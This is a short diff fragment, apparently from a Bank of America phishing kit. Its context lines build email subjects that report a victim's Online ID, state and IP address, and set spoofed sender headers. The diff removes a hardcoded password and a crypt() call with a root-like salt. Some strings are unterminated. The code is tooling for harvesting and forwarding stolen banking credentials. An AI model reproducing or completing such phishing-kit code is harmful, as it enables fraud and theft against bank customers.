@@ -20,8 +20,6 @@ $subject = "xBOA LOADING 100% : $ip"
 $subject = "BOA $OnlineID - $State - $ip"
 $headers = "From: BOA<customer-support@Spammers>
 $headers = "From: BOB Customer<Border@Source.Land>"
-$password='azerty123.0@10'
-$pwd = crypt($password,'$6$roottn$')
 #------------------------------------------------------------------------------------------------------------------------
 #                                                Bank of America - Banking, Credit Cards, Home Loans and Auto Loans
 #------------------------------------------------------------------------------------------------------------------------
